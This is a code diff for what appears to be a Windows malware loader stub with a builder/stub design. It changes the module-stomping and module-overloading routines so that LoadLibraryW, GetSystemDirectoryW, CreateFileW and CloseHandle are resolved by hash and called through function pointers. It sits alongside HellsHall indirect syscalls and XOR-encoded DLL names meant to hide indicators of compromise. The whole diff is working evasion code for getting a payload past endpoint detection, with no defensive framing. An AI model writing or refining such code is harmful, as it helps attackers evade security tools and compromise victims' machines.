@@ -10,10 +10,13 @@
 
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 
-/* Syscall + VirtualAlloc/Free typedefs — used only within this translation unit */
-typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+/* Syscall + kernel32 typedefs — used only within this translation unit */
+typedef NTSTATUS (NTAPI  *pfnNtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
 typedef LPVOID   (WINAPI *pfnVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL     (WINAPI *pfnVirtualFree_t)(LPVOID, SIZE_T, DWORD);
+typedef HMODULE  (WINAPI *pfnLoadLibraryW_t)(LPCWSTR);
+typedef UINT     (WINAPI *pfnGetSystemDirectoryW_t)(LPWSTR, UINT);
+typedef HANDLE   (WINAPI *pfnCreateFileW_t)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 
 /* 10-DLL lookup table — XOR-encoded (key 0x5A) to avoid plaintext wide-string
  * IOCs in .rdata.  Builder stores 3 chosen indices in .rsrc; Stub decodes
@@ -81,11 +84,12 @@ PVOID ModuleStomp_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
 
     pfnNtProtectVirtualMemory_t Sys_NtProtect = (pfnNtProtectVirtualMemory_t)HellsHallSyscall;
 
-    /* Resolve VirtualAlloc / VirtualFree for the save-buffer allocation.
-     * These are the only kernel32 exports used directly here. */
-    HMODULE          hKernel32   = GetModuleHandleH(g_Hash_kernel32);
-    pfnVirtualAlloc_t pVirtAlloc = (pfnVirtualAlloc_t)GetProcAddressH(hKernel32, g_Hash_VirtualAlloc);
-    pfnVirtualFree_t  pVirtFree  = (pfnVirtualFree_t)GetProcAddressH(hKernel32, g_Hash_VirtualFree);
+    /* Resolve kernel32 exports for save-buffer allocation and DLL loading. */
+    HMODULE           hKernel32    = GetModuleHandleH(g_Hash_kernel32);
+    pfnVirtualAlloc_t pVirtAlloc   = (pfnVirtualAlloc_t)GetProcAddressH(hKernel32, g_Hash_VirtualAlloc);
+    pfnVirtualFree_t  pVirtFree    = (pfnVirtualFree_t) GetProcAddressH(hKernel32, g_Hash_VirtualFree);
+    pfnLoadLibraryW_t pLoadLibW    = (pfnLoadLibraryW_t)GetProcAddressH(hKernel32, g_Hash_LoadLibraryW);
+    if (!pLoadLibW) return NULL;
 
     /* Iterate over the 3 caller-supplied indices, resolving DLL names from
      * g_DllPool at runtime.  Invalid indices (>= 10) are skipped safely. */
@@ -95,7 +99,7 @@ PVOID ModuleStomp_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
 
         WCHAR dllNameBuf[32];
         DecodeDllName(idx, dllNameBuf);
-        HMODULE hModule = LoadLibraryW(dllNameBuf);
+        HMODULE hModule = pLoadLibW(dllNameBuf);
         if (!hModule) continue;
 
         PBYTE pBase = (PBYTE)hModule;
@@ -182,13 +186,16 @@ PVOID ModuleOverload_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
 
     pfnNtProtectVirtualMemory_t Sys_NtProtect = (pfnNtProtectVirtualMemory_t)HellsHallSyscall;
 
-    HMODULE           hKernel32  = GetModuleHandleH(g_Hash_kernel32);
-    pfnVirtualAlloc_t pVirtAlloc = (pfnVirtualAlloc_t)GetProcAddressH(hKernel32, g_Hash_VirtualAlloc);
-    pfnVirtualFree_t  pVirtFree  = (pfnVirtualFree_t)GetProcAddressH(hKernel32, g_Hash_VirtualFree);
+    HMODULE                  hKernel32   = GetModuleHandleH(g_Hash_kernel32);
+    pfnVirtualAlloc_t        pVirtAlloc  = (pfnVirtualAlloc_t)       GetProcAddressH(hKernel32, g_Hash_VirtualAlloc);
+    pfnVirtualFree_t         pVirtFree   = (pfnVirtualFree_t)        GetProcAddressH(hKernel32, g_Hash_VirtualFree);
+    pfnGetSystemDirectoryW_t pGetSysDir  = (pfnGetSystemDirectoryW_t)GetProcAddressH(hKernel32, g_Hash_GetSystemDirectoryW);
+    pfnCreateFileW_t         pCreateFile = (pfnCreateFileW_t)        GetProcAddressH(hKernel32, g_Hash_CreateFileW);
+    if (!pGetSysDir || !pCreateFile) return NULL;
 
     /* Get system directory once — used to build full DLL paths */
     WCHAR sysDir[MAX_PATH];
-    if (!GetSystemDirectoryW(sysDir, MAX_PATH)) return NULL;
+    if (!pGetSysDir(sysDir, MAX_PATH)) return NULL;
 
     for (int i = 0; i < 3; i++) {
         BYTE idx = dll_indices[i];
@@ -205,7 +212,7 @@ PVOID ModuleOverload_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
         dllPath[k] = L'\0';
 
         /* Open a read handle to the DLL file — needed for NtCreateSection(SEC_IMAGE) */
-        HANDLE hFile = CreateFileW(dllPath, GENERIC_READ,
+        HANDLE hFile = pCreateFile(dllPath, GENERIC_READ,
                                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                                    NULL, OPEN_EXISTING, 0, NULL);
         if (hFile == INVALID_HANDLE_VALUE) continue;
@@ -216,7 +223,7 @@ PVOID ModuleOverload_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
         HANDLE   hSection = NULL;
         NTSTATUS st = pNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE,
                                        NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
-        CloseHandle(hFile);
+        pNtClose(hFile);
         if (!NT_SUCCESS(st) || !hSection) continue;
 
         /* Map the section into our process — disk-backed, not in PEB LDR */
